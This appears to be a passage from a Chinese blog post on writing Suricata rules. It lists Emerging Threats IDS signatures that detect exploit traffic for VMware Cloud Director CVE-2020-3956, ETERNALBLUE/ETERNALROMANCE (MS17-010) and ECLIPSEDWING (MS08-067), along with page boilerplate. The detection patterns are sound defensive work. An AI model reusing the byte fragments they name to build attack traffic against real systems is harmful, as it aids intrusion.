2020_06_02;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">alert http $EXTERNAL_NET any -&gt; $HTTP_SERVERS any (msg:&quot;ET EXPLOIT Possible VMware Cloud Director RCE Attempt (CVE-2020-3956)&quot;; flow:established,to_server; http.method; content:&quot;PUT&quot;; http.cookie; content:&quot;vcloud_jwt=&quot;; startswith; http.request_body; content:&quot;|3a|Host|3e 24 7b|&quot;; content:&quot;.getDeclaredConstructors|28 29 5b|&quot;; distance:0; fast_pattern; flowbits:set,ET.20203956; reference:url,citadelo.com/en/blog/full-infrastructure-takeover-of-vmware-cloud-director-CVE-2020-3956/; classtype:attempted-admin; sid:2030240; rev:1; metadata:affected_product VMware, attack_target Server, created_at 2020_06_02, deployment Perimeter, former_category EXPLOIT, performance_impact Low, signature_severity Major, updated_at 2020_06_02;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">alert http $HTTP_SERVERS any -&gt; $EXTERNAL_NET any (msg:&quot;ET EXPLOIT Possible Successful VMware Cloud Director RCE Attempt (CVE-2020-3956)&quot;; flow:established,from_server; http.stat_code; content:&quot;400&quot;; http.response_body; content:&quot;&lt;Error&quot;; content:&quot;has|20|invalid|20|length|20|for&quot;; fast_pattern; flowbits:isset,ET.20203956; reference:url,citadelo.com/en/blog/full-infrastructure-takeover-of-vmware-cloud-director-CVE-2020-3956/; classtype:attempted-admin; sid:2030241; rev:1; metadata:affected_product VMware, attack_target Server, created_at 2020_06_02, deployment Perimeter, former_category EXPLOIT, performance_impact Low, signature_severity Major, updated_at 2020_06_02;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h2 id="MS17-010"><a href="#MS17-010" class="headerlink" title="MS17_010"></a>MS17_010</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">alert smb any any -&gt; $HOME_NET any (msg:&quot;ET EXPLOIT Possible Successful ETERNALROMANCE MS17-010 - Windows Executable Observed&quot;; flow:to_server,established; flowbits:isset,ETPRO.ETERNALROMANCE; content:&quot;|FF|SMB|26 00 00 00 00|&quot;; offset:4; depth:9; content:&quot;|4d 5a|&quot;; distance:0; content:&quot;This program cannot be run&quot;; nocase; distance:0; fast_pattern; classtype:trojan-activity; sid:2024207; rev:3; metadata:attack_target SMB_Server, created_at 2017_04_17, deployment Internal, former_category EXPLOIT, signature_severity Critical, updated_at 2022_03_17;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">alert tcp any any -&gt; any 445 (msg:&quot;ET EXPLOIT ETERNALBLUE Exploit M2 MS17-010&quot;; flow:established,to_server; content:&quot;|8000a80000000000000000000000000000000000ffff000000000000ffff0000000000000000000000000000000000000000000000f1dfff000000000000000020f0dfff00f1dfffffffffff600004100000000080efdfff|&quot;; reference:cve,CVE-2017-0143; classtype:attempted-admin; sid:2024297; rev:2; metadata:affected_product Windows_XP_Vista_7_8_10_Server_32_64_Bit, attack_target Client_Endpoint, created_at 2017_05_16, deployment Perimeter, former_category CURRENT_EVENTS, performance_impact Low, signature_severity Major, updated_at 2017_07_06;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">alert smb any any -&gt; $HOME_NET any (msg:&quot;ET EXPLOIT Possible ETERNALBLUE Exploit M3 MS17-010&quot;; flow:to_server,established; content:&quot;|ff|SMB|32 00 00 00 00 18 07 c0|&quot;; offset:4; depth:12; content:&quot;|00 00 00 00 00 00 00 00 00 00 00 08 ff fe 00 08|&quot;; distance:2; within:16; fast_pattern; content:&quot;|0f 0c 00 00 10 01 00 00 00 00 00 00 00 f2 00 00 00 00 00 0c 00 42 00 00 10 4e 00 01 00 0e 00 0d 10 00|&quot;; distance:2; within:34; isdataat:1000,relative; threshold: type both, track by_src, count 10, seconds 1; classtype:trojan-activity; sid:2024430; rev:3; metadata:affected_product Windows_XP_Vista_7_8_10_Server_32_64_Bit, attack_target Client_Endpoint, created_at 2017_06_27, deployment Perimeter, deployment Internal, former_category EXPLOIT, signature_severity Critical, updated_at 2017_07_06;)</span><br></pre></td></tr></table></figure>
+<p>MS08_067</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alert smb any any -&gt; $HOME_NET any (msg:&quot;ET EXPLOIT Possible ECLIPSEDWING MS08-067&quot;; flow:to_server,established; content:&quot;|ff|SMB|2f 00 00 00 00|&quot;; offset:4; depth:9; content:&quot;|00 00 00 00 ff ff ff ff 08 00|&quot;; distance:30; within:10; content:&quot;|2e 00 00 00 00 00 00 00 2e 00 00 00|&quot;; distance:0; content:&quot;|2f 00 41 00 2f 00 2e 00 2e 00 2f 00|&quot;; within:12; fast_pattern; content:&quot;|2e 00 00 00 00 00 00 00 2e 00 00 00|&quot;; distance:0; content:&quot;|2f 00 41 00 2f 00 2e 00 2e 00 2f 00|&quot;; within:12; content:&quot;|2f 00 41 00 2f 00 2e 00 2e 00 2f 00|&quot;; distance:0; content:&quot;|2f 00 41 00 2f 00 2e 00 2e 00 2f 00|&quot;; distance:0; isdataat:800,relative; classtype:trojan-activity; sid:2024215; rev:1; metadata:attack_target SMB_Server, created_at 2017_04_17, deployment Internal, former_category EXPLOIT, signature_severity Critical, updated_at 2017_04_17;)</span><br></pre></td></tr></table></figure>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="http://www.mathming.ltd">Spencer</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://www.mathming.ltd/2022/06/20/2022-6-20-suricata%E8%A7%84%E5%88%99%E7%9A%84%E7%BC%96%E5%86%99/">http://www.mathming.ltd/2022/06/20/2022-6-20-suricata%E8%A7%84%E5%88%99%E7%9A%84%E7%BC%96%E5%86%99/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/suricata/">suricata</a></div><div class="post_share"><div class="social-share" data-image="https://images.pexels.com/photos/1509534/pexels-photo-1509534.jpeg?auto=compress&amp;cs=tinysrgb&amp;w=1260&amp;h=750&amp;dpr=1" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i> Donate</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/wechat.jpg" target="_blank"><img class="post-qr-code-img" src="/img/wechat.jpg" alt="wechat"/></a><div class="post-qr-code-desc">wechat</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2022/07/02/%E7%94%A8%E6%88%B7%E5%88%87%E6%8D%A2%E4%B8%8E%E6%8F%90%E6%9D%83/"><img class="prev-cover" src="https://images.pexels.com/photos/1509534/pexels-photo-1509534.jpeg?auto=compress&amp;cs=tinysrgb&amp;w=1260&amp;h=750&amp;dpr=1" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">linux用户权限管理</div></div></a></div><div class="next-post pull-right"><a href="/2022/06/14/2022-6-14-windows%E6%BC%8F%E6%B4%9E/"><img class="next-cover" src="https://images.pexels.com/photos/1509534/pexels-photo-1509534.jpeg?auto=compress&amp;cs=tinysrgb&amp;w=1260&amp;h=750&amp;dpr=1" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">windows漏洞</div></div></a></div></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> Comment</span></div><div id="comment-switch"><span class="first-comment">Valine</span><span class="switch-btn"></span><span class="second-comment">Disqus</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div><div><div id="disqus_thread"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#weevely%E4%BA%A7%E7%94%9F%E7%9A%84PHP%E6%9C%A8%E9%A9%AC%E6%A0%BC%E5%BC%8F"><span class="toc-number">1.</span> <span class="toc-text">weevely产生的PHP木马格式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MS17-010"><span class="toc-number">2.</span> <span class="toc-text">MS17_010</span></a></li></ol></div></div></div></div></main><footer id="footer" style="background-image: url('https://images.pexels.com/photos/1509534/pexels-photo-1509534.jpeg?auto=compress&amp;cs=tinysrgb&amp;w=1260&amp;h=750&amp;dpr=1')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By Spencer</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="Switch Between Traditional Chinese And Simplified Chinese">繁</button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="chat_btn" type="button" title="Chat"><i class="fas fa-sms"></i></button><a id="to_comment" href="#post-comment" title="Scroll To Comments"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><div class="js-pjax"><script>if (!window.MathJax) {
+  window.MathJax = {
+    tex: {
+      inlineMath: [ ['$','$'], ["\\(","\\)"]],
+      tags: 'ams'
+    },
+    chtml: {
+      scale: 1.1
+    },
+    options: {
+      renderActions: {
+        findScript: [10, doc => {
+          for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
+            const display = !!node.type.match(/; *mode=display/)
+            const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display)
+            const text = document.createTextNode('')
+            node.parentNode.replaceChild(text, node)
+            math.start = {node: text, delim: '', n: 0}
+            math.end = {node: text, delim: '', n: 0}
+            doc.math.push(math)
+          }
+        }, ''],
+        insertScript: [200, () => {
+          document.querySelectorAll('mjx-container').forEach(node => {
+            if (node.hasAttribute('display')) {
+              btf.wrap(node, 'div', { class: 'mathjax-overflow' })
+            } else {
+              btf.wrap(node, 'span', { class: 'mathjax-overflow' })
+            }
+          });
+        }, '', false]
+      }
+    }
+  }
+  
+  const script = document.createElement('script')
+  script.src = 'https://cdn.jsdelivr.net/npm/mathjax/es5/tex-mml-chtml.min.js'
+  script.id = 'MathJax-script'
+  script.async = true
+  document.head.appendChild(script)
+} else {
+  MathJax.startup.document.state(0)
+  MathJax.texReset()
+  MathJax.typeset()
+}</script><script>function loadValine () {
+  function initValine () {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      appId: '',
+      appKey: '',
+      avatar: 'monsterid',
+      serverURLs: '',
+      emojiMaps: "",
+      path: window.location.pathname,
+      visitor: false
+    }, null))
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
+}
+
+if ('Valine' === 'Valine' || !true) {
+  if (true) btf.loadComment(document.getElementById('vcomment'),loadValine)
+  else setTimeout(loadValine, 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script><script>function loadDisqus () {
+  var disqus_config = function () {
+    this.page.url = 'http://www.mathming.ltd/2022/06/20/2022-6-20-suricata%E8%A7%84%E5%88%99%E7%9A%84%E7%BC%96%E5%86%99/'
+    this.page.identifier = '/2022/06/20/2022-6-20-suricata%E8%A7%84%E5%88%99%E7%9A%84%E7%BC%96%E5%86%99/'
+    this.page.title = 'suricata规则的编写'
+  };
+
+  window.disqusReset = () => {
+    DISQUS.reset({
+      reload: true,
+      config: disqus_config
+    })
+  }
+
+  if (window.DISQUS) disqusReset()
+  else {
+    (function() { 
+      var d = document, s = d.createElement('script');
+      s.src = 'https://.disqus.com/embed.js';
+      s.setAttribute('data-timestamp', +new Date());
+      (d.head || d.body).appendChild(s);
+    })();
+  }
+
+  document.getElementById('darkmode').addEventListener('click', () => {
+    setTimeout(() => window.disqusReset(), 200)
+  })
+}
+
+if ('Valine' === 'Disqus' || !true) {
+  if (true) btf.loadComment(document.getElementById('disqus_thread'), loadDisqus)
+  else loadDisqus()
+} else {
+  function loadOtherComment () {
+    loadDisqus()
+  }
+}
+</script></div><a href="https://beian.miit.gov.cn/" target="_blank" class="is-center">冀ICP备2021024675号-1</a><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/fireworks.min.js"></script><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="false" data-click="false"></script><script defer="defer" id="fluttering_ribbon" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-fluttering-ribbon.min.js"></script><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-show-text.min.js" data-mobile="false" data-text="I,LOVE,YOU" data-fontsize="15px" data-random="true" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
